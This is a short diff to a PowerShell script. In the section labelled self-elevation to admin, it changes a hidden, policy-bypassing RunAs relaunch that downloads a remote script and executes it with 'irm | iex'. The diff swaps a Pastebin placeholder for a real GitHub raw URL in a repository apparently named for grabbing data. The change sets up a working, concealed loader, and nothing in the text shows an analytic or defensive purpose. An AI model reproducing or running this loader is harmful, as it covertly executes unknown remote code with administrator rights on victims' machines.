@@ -2,7 +2,7 @@
 
 # --- Priority 0: Self-Elevate to Admin (UAC) ---
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"irm https://pastebin.com/raw/YOUR_PASTEBIN_ID | iex`"" -Verb RunAs
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"irm https://raw.githubusercontent.com/swertengkumag/mass-grabe/refs/heads/main/windows.ps1 | iex`"" -Verb RunAs
     exit
 }
 
